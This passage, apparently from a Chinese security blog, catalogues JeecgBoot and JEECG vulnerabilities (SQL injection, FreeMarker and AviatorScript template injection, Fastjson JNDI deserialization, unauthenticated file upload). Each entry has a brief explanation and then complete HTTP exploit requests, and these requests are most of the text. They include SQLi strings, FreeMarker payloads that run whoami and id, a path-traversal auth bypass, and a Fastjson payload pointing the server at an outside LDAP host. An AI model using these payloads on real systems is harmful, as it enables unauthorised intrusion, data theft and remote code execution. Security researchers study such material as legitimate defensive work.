+<p>之前我们也提到过MyBatis的<code>$&#123;&#125;</code>，它表示字符串直接拼接，在MyBatis中还有一种写法<code>#&#123;&#125;</code>表示作为参数占位符，由预编译处理，所以相对来说<code>#&#123;&#125;</code>会安全些</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>Sec-Purpose: prefetch</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Priority: u=6</span></span></code></pre>
+<h2 id="jeecg-boot-jmreportshow-sql注入漏洞"><a class="anchor" href="#jeecg-boot-jmreportshow-sql注入漏洞">#</a> Jeecg-Boot /jmreport/show SQL注入漏洞</h2>
+<p>该漏洞是<code>JeecgBoot</code>集成的<code>JimuReport</code>积木报表模块中的一个报表预览接口注入问题，主要出现在<code>JeecgBoot 3.5.0、3.5.1</code>，其主要表现为<code>/jeecg-boot/jmreport/show</code>组件存在SQL注入</p>
+<p><code>jmreport/show</code>这个接口属于<code>JimuReport</code>报表的预览/展示接口，其正常业务逻辑为前端点击“预览报表”之后，服务器端请求<code>jeecg-boot/jmreport/show</code>，后端根据报表的id寻找报表配置，进而读取报表里配置的数据源SQL，然后把前端传入的查询参数带入SQL，最后执行SQL返回报表数据</p>
+<p>其问题出现在<code>/jeecg-boot/jmreport/show</code>接口存在未授权SQL注入，在报表展示逻辑中，后端会进入<code>jmReportDesignService.show</code>，随后调用报表数据查询逻辑，其动态SQL类似<code>select * from ... where id='$&#123;id&#125;'</code>，说明参数以模版替换形式进入SQL</p>
+<p>在<code>JeecgBoot 3.5.3</code>的<code>/jeecg-boot/jmreport/show</code>接口中仍存在SQL注入问题，并且可以通过布尔盲注绕过防护</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>POST /jeecg-boot/jmreport/show HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Length: 182</span></span>
+<span class="line"><span>Content-Type: application/json;charset=UTF-8</span></span>
+<span class="line"><span>Accept-Encoding: gzip</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;</span></span>
+<span class="line"><span>"id": "961455b47c0b86dc961e90b5893bff05",</span></span>
+<span class="line"><span>"apiUrl": "",</span></span>
+<span class="line"><span>"params": &#123;</span></span>
+<span class="line"><span>"id ": "1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '"</span></span>
+<span class="line"><span>&#125;</span></span>
+<span class="line"><span>&#125;</span></span></code></pre>
+<h2 id="jeecg-boot-sysduplicatecheck-sql注入"><a class="anchor" href="#jeecg-boot-sysduplicatecheck-sql注入">#</a> jeecg-boot sys/duplicate/check SQL注入</h2>
+<p>该漏洞是<code>JeecgBoot</code>里“重复值校验接口”产生的SQL注入问题，包括<code>CVE-2022-45206</code>和后续绕过/变体<code>CVE-2023-37805</code></p>
+<p><code>/sys/duplicaye/check</code>接口的作用是检查某张表里的字段的值是否重复</p>
+<p>比如后台新增用户时，要判断用户名是否已经存在，前端可能会让后端检查：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>tableName = sys_user</span></span>
+<span class="line"><span>fieldName = username</span></span>
+<span class="line"><span>fieldVal  = admin</span></span>
+<span class="line"><span>dataId    = 当前编辑数据的 id，可选</span></span></code></pre>
+<p>后端正常逻辑大概是<code>select count(*) from 某张表 where 某字段 = 某个值</code>，如果<code>count &gt; 0</code>就说明重复，如果<code>count = 0</code>说明可用</p>
+<p>其中<code>tableName</code>和<code>fieldName</code>属于SQL结构的一部分，后端如果把他们直接拼进SQL就会出现：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>select count(*) from $&#123;tableName&#125; where $&#123;fieldName&#125; = #&#123;fieldVal&#125;</span></span></code></pre>
+<p>这里即使<code>fieldVal</code>使用了预编译，但<code>tableName</code>和<code>fieldName</code>没有严格白名单校验，仍然可以控制SQL结构，在<code>JeecgBoot 3.5.0</code>中的<code>/sys/duplicate/check</code>接口中存在SQL注入，<code>checksql</code>可以被绕过</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&#x26;fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))&#x26;fieldVal=1&#x26;dataId=asd HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Language: en-US;q=0.9,en;q=0.8</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span>X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>GET /jeecg-boot/sys/duplicate/check?tableName=sys_log&#x26;fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(10))&#x26;fieldVal=1000&#x26;dataId=2000 HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Language: en-US;q=0.9,en;q=0.8</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span>X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</span></span></code></pre>
+<h2 id="jeecgboot-jmreportloadtabledata-ssti模板注入漏洞"><a class="anchor" href="#jeecgboot-jmreportloadtabledata-ssti模板注入漏洞">#</a> JeecgBoot jmreport/loadTableData SSTI模板注入漏洞</h2>
+<p>该漏洞一般对应<code>CVE-2023-41544</code>，它是<code>JeecgBoot</code>集成的JimuReport积木报表模块在处理报表SQL参数时，使用<code>FreeMarker</code>模版引擎解析了用户可控内容，导致服务端模板注入，严重时可发展为远程代码执行RCE。攻击者可通过构造HTTP请求访问<code>/jmreport/loadTableData</code>组件执行任意代码</p>
+<p><code>/jmreport/loadTableData</code>接口属于<code>JimuReport</code>积木报表的数据加载接口，正常情况下报表设计器里会配置数据源、SQL、表名、分页参数等信息，前端请求<code>/jmreport/loadTableData</code>之后后端根据这些参数去加载报表数据</p>
+<p>该接口没有身份验证，且后端会使用FreeMarker处理用户传入的SQL参数，调用链中会进入<code>parseReportSql</code>，最终使用<code>FreeMarkerUtils</code>创建并处理模版，即SQL字符串会先被当做FreeMarker模版内容解析</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>POST /jeecg-boot/jmreport/loadTableData HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0</span></span>
+<span class="line"><span>Accept: application/json, text/plain, */*</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Content-Type: application/json;charset=UTF-8</span></span>
+<span class="line"><span>X-Sign: AD0488642A880C68C8E3551C3BE0F6F5</span></span>
+<span class="line"><span>X-TIMESTAMP: 1699726206096</span></span>
+<span class="line"><span>X-Access-Token: null</span></span>
+<span class="line"><span>token: null</span></span>
+<span class="line"><span>JmReport-Tenant-Id: null</span></span>
+<span class="line"><span>Content-Length: 167</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726144; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726162</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"dbSource":"","sql":"select '&#x3C;#assign value=\"freemarker.template.utility.Execute\"?new()>$&#123;value(\"whoami\")&#125;'","tableName":"test_demo);","pageNo":1,"pageSize":10&#125;</span></span></code></pre>
+<h2 id="jeecgboot-aviatorscript表达式注入"><a class="anchor" href="#jeecgboot-aviatorscript表达式注入">#</a> JeecgBoot AviatorScript表达式注入</h2>
+<p>该漏洞主要发生在<code>JeecgBoot</code>集成的<code>JimuReport</code>模块中，在报表单元格、文本组件或计算表达式中允许写入<code>AviatorScript</code>表达式，而后端在预览、展示报表时会解析这些表达式，如果这部分表达式内容可控就可能造成服务端执行非预期代码，严重时导致RCE</p>
+<p>其触发链可以通过<code>/jmreport/save</code>在报表文本内容里写入<code>AviatorScript</code>表达式，然后访问<code>/jmreport/show</code>触发表达式解析，从而导致命令执行</p>
+<p><strong>AviatorScript表达式</strong>：AviatorScript是Java生态中的一个表达式引擎，常用作动态计算、条件判断、公式解析，它的表达式可以包含数字、字符串、布尔值、变量、运算符、函数调用和条件判断</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 结果为7</span></span>
+<span class="line"><span>AviatorEvaluator.execute("1 + 2 * 3");</span></span></code></pre>
+<p>这里的<code>1+2*3</code>就是一个AviatorScript表达式，与普通的Java代码不一样的是，AviatorScript表达式可以在程序运行时从字符串中动态解析并执行，那么，如果表达式引擎具备访问Java对象、类加载、函数调用等能力，就会从公式计算变成服务端表达式执行</p>
+<p>其漏洞链路大致为：发现能访问报表保存接口之后在报表text/单元格内容中写入AviatorScript表达式，接着访问报表展示接口导致后端渲染报表触发AviatorScript解析，从而执行非预期表达式</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&#x26;jmLink=YWFhfHxiYmI=&#x26;token=123 HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span></span>
+<span class="line"><span>Accept: application/json, text/plain, */*</span></span>
+<span class="line"><span>Content-Type: application/json</span></span>
+<span class="line"><span>Content-Length: 108</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"sql":"select 'result:&#x3C;#assign ex=\"freemarker.template.utility.Execute\"?new()> $&#123;ex(\"whoami \") &#125;'" </span></span>
+<span class="line"><span>&#125;</span></span></code></pre>
+<h2 id="jeecg-boot后台sysmessagetemplatesendmsg接口freemaker模板注入"><a class="anchor" href="#jeecg-boot后台sysmessagetemplatesendmsg接口freemaker模板注入">#</a> jeecg-boot后台/sysMessageTemplate/sendMsg接口FreeMaker模板注入</h2>
+<p>该漏洞本质是消息模版功能把用户可控的模版内容交给FreeMarker引擎解析，导致服务端可能执行非预期的模版表达式，严重时造成远程代码执行</p>
+<p><code>/sysMessageTemplate/sendMsg</code>这个接口属于JeecgBoot的系统消息模版功能，正常业务逻辑中，管理员创建消息模版，然后向模版中写入变量，调用sendMsg接口发送模版消息，最后用户就可以在站内信或者系统消息中看到最终内容</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>添加模版：/jeecg-boot/sys/message/sysMessageTemplate/add</span></span>
+<span class="line"><span>发送模版：/jeecg-boot/sys/message/sysMessageTemplate/sendMsg</span></span>
+<span class="line"><span>查看结果：/jeecg-boot/sys/message/sysMessage/list</span></span></code></pre>
+<p>如果模版内容能被恶意地添加或修改，再调用发送接口，就可能让后端解析恶意的FreeMarker模版</p>
+<p>之前我们提到了<code>/jmreport/loadTableData</code>SSTI，它和<code>sendMsg</code>的区别在于前者是报表SQL参数被<code>FreeMarker</code>解析，属于积木报表模块，后者属于消息模版内容被FreeMarker解析，属于系统消息模版模块</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>1、添加一个测试模板</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>POST /jeecg-boot/sys/message/sysMessageTemplate/add HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</span></span>
+<span class="line"><span>Accept: application/json, text/plain, */*</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao</span></span>
+<span class="line"><span>Tenant-Id: 0</span></span>
+<span class="line"><span>Sec-Fetch-Dest: empty</span></span>
+<span class="line"><span>Sec-Fetch-Mode: cors</span></span>
+<span class="line"><span>Sec-Fetch-Site: cross-site</span></span>
+<span class="line"><span>Priority: u=0</span></span>
+<span class="line"><span>Te: trailers</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Type: application/json;charset=UTF-8</span></span>
+<span class="line"><span>Content-Length: 141</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"templateType":"1","templateCode":"5","templateName":"test111","templateContent":"$&#123;\"freemarker.template.utility.Execute\"?new()(\"id\")&#125;"&#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>2、发送模板</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</span></span>
+<span class="line"><span>Accept: application/json, text/plain, */*</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao</span></span>
+<span class="line"><span>Tenant-Id: 0</span></span>
+<span class="line"><span>Sec-Fetch-Dest: empty</span></span>
+<span class="line"><span>Sec-Fetch-Mode: cors</span></span>
+<span class="line"><span>Sec-Fetch-Site: cross-site</span></span>
+<span class="line"><span>Priority: u=0</span></span>
+<span class="line"><span>Te: trailers</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Type: application/json;charset=UTF-8</span></span>
+<span class="line"><span>Content-Length: 64</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"templateCode":"5","testData":"&#123;&#125;","receiver":"","msgType":"1"&#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>3、执行模板并查看返回结果</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>GET /jeecg-boot/sys/message/sysMessage/list?_t=1732776144&#x26;column=createTime&#x26;order=desc&#x26;field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&#x26;pageNo=1&#x26;pageSize=10 HTTP/1.1</span></span>
+<span class="line"><span>Host:</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</span></span>
+<span class="line"><span>Accept: application/json, text/plain, */*</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao</span></span>
+<span class="line"><span>Tenant-Id: 0</span></span>
+<span class="line"><span>Sec-Fetch-Dest: empty</span></span>
+<span class="line"><span>Sec-Fetch-Mode: cors</span></span>
+<span class="line"><span>Sec-Fetch-Site: cross-site</span></span>
+<span class="line"><span>Priority: u=0</span></span>
+<span class="line"><span>Te: trailers</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Accept-Encoding: gzip</span></span></code></pre>
+<h2 id="jeecg-jeecgformdemocontroller存在jndi代码执行漏洞"><a class="anchor" href="#jeecg-jeecgformdemocontroller存在jndi代码执行漏洞">#</a> Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞</h2>
+<p><strong>CVE-2023-49442</strong>：<code>JEECG jeecgFormDemoController JNDI</code>代码执行漏洞，特别：Jeecg与Jeecg-Boot不是同一个应用，该漏洞主要影响<code>JEECG 4.0</code>及以前版本</p>
+<p>在<code>JEECG 4.0</code>及以前版本中，<code>jeecgFormDemoController.do?interfaceTest</code>接口存在不安全反序列化/JNDI注入风险，用户可以通过构造恶意请求让服务端通过JNDI去加载远程对象，最终可能造成远程代码执行</p>
+<p><strong>JNDI</strong>：<code>Java Naming and Directory Interface</code>，Java命名与目录接口，正常业务逻辑中是作为资源查找机制，但如果能控制JNDI查询地址，例如让服务器去查询一个外部LDAP/RMI地址，就可能诱导服务器加载恶意对象或触发危险类从而形成代码执行</p>
+<p><code>jeecgFormDemoController</code>是JEECG旧版专用的Online表单/表单演示控制器，漏洞相关接口通常写成：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>jeecgFormDemoController.do??interfaceTest</span></span></code></pre>
+<p>这个漏洞的核心大概是接口接收用户提交的数据之后后端使用存在风险的<code>Fastjson</code>版本（Fastjson 1.2.31）处理数据，导致触发不安全的反序列化，在反序列化过程中触发<code>JNDI lookup</code>，接下来服务端访问攻击者控制的远程地址导致加载恶意对象或触发恶意逻辑，最终实现远程代码执行</p>
+<p>这个漏洞经常和路径绕过问题一起出现，在JEECG 4.0及以前版本中，<code>/api</code>接口鉴权时没有正确过滤路径遍历，可以构造包含<code>../</code>的URL绕过鉴权，然后访问<code>jeecgFormDemoController.do?interfaceTest</code></p>
+<p>所以实际上在原本接口可能需要权限的条件下，<code>/api</code>鉴权逻辑可能存在路径处理问题，接下来我们就可以通过<code>../</code>绕过访问控制访问<code>interfaceTest</code>接口提交恶意反序列化数据，从而触发JDNI代码执行</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>Pragma: no-cache</span></span>
+<span class="line"><span>Cache-Control: no-cache</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>cmd: whoami</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.9</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span>Content-Length: 77</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>serverUrl=http://xxxxxxxx:8877/jeecg.txt&#x26;requestBody=1&#x26;requestMethod=GET</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>创建如下远程文件，其内容为fastjson代码执行的payload</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;</span></span>
+<span class="line"><span>"a":&#123;</span></span>
+<span class="line"><span>"@type":"java.lang.Class",</span></span>
+<span class="line"><span>"val":"com.sun.rowset.JdbcRowSetImpl"</span></span>
+<span class="line"><span>&#125;,</span></span>
+<span class="line"><span>"b":&#123;</span></span>
+<span class="line"><span>"@type":"com.sun.rowset.JdbcRowSetImpl",</span></span>
+<span class="line"><span>"dataSourceName":"ldap://10.66.64.89:1389/8orsiq",</span></span>
+<span class="line"><span>"autoCommit":true</span></span>
+<span class="line"><span>&#125;</span></span>
+<span class="line"><span>&#125;</span></span></code></pre>
+<h2 id="jeecg-bootjmreportupload接口存在未授权任意文件上传"><a class="anchor" href="#jeecg-bootjmreportupload接口存在未授权任意文件上传">#</a> jeecg-boot/jmreport/upload接口存在未授权任意文件上传</h2>
+<p><strong>CVE-2023-34660</strong>：属于JimuReport积木报表模块中的文件上传接口安全问题，本质上属于报表设计器里的上传接口没有做好访问控制和文件类型校验，导致可以上传非预期类型文件从而造成存储型XSS，常见接口是<code>jeccg-boot/jmreport/upload</code></p>
+<p>它原本是给报表设计器上传图片或资源文件使用，可通过“报表设计器-&gt;新建报表-&gt;插入图片”触发上传流程，重点影响<code>JeecgBoot 3.5.0/3.5.1</code></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>POST /jeecg-boot/jmreport/upload HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.9</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4</span></span>
+<span class="line"><span>Cache-Control: no-cache</span></span>
+<span class="line"><span>Pragma: no-cache</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>Content-Length: 1476</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>------WebKitFormBoundaryyfyhSCMs9cajzFD4</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="file"; filename="11111.txt"</span></span>
+<span class="line"><span>Content-Type: text/html</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#x3C;%! 1111></span></span>
+<span class="line"><span>------WebKitFormBoundaryyfyhSCMs9cajzFD4</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="fileName"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>11111.txt</span></span>
+<span class="line"><span>------WebKitFormBoundaryyfyhSCMs9cajzFD4</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="biz"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>excel_online</span></span>
+<span class="line"><span>------WebKitFormBoundaryyfyhSCMs9cajzFD4--</span></span></code></pre>
+<h2 id="jeecg-commoncontrollerdo文件上传"><a class="anchor" href="#jeecg-commoncontrollerdo文件上传">#</a> Jeecg-commonController.do文件上传</h2>
+<p><strong>CVE-2022-2647</strong>：Jeecg/JeecgBoot中某些版本的<code>commonController.do</code>上传处理接口缺少严格鉴权和文件类型限制，可能通过构造上传请求写入非预期文件，严重时可造成RCE，常见的被提到的入口为<code>/commonController.do?parserXml</code>，部分资料中会结合路径绕过写成<code>/api/../commonController.do?parserXml</code></p>
+<p>该接口的正常业务逻辑可以理解为前端上传文件之后，<code>commonController.do</code>接收<code>multipart//form-data</code>，后端解析文件内容或保存文件之后返回上传结果</p>
+<p>同样，问题的核心在于<code>/api</code>接口鉴权时没有过滤路径遍历，导致可以构造包含<code>../</code>的URL绕过鉴权，再利用<code>commonController</code>接口进行文件上传</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1</span></span>
+<span class="line"><span>Host:</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Content-Length: 360</span></span>
+<span class="line"><span>User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95</span></span>
+<span class="line"><span>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>------WebKitFormBoundarygcflwtei</span></span>
+<span class="line"><span>Content-Disposition: form-data; "name="name"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>zW9YCa.png</span></span>
+<span class="line"><span>------WebKitFormBoundarygcflwtei</span></span>
+<span class="line"><span>ontent-Disposition: form-data; name="documentTitle"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>blank</span></span>
+<span class="line"><span>------WebKitFormBoundarygcflwtei</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"</span></span>
+<span class="line"><span>Content-Type: image/png</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>11111</span></span>
+<span class="line"><span>------WebKitFormBoundarygcflwtei--</span></span></code></pre>
+<h2 id="常见的jeecg-boot接口与常见的jeecg-boot漏洞利用工具"><a class="anchor" href="#常见的jeecg-boot接口与常见的jeecg-boot漏洞利用工具">#</a> 常见的jeecg-boot接口与常见的jeecg-boot漏洞利用工具</h2>
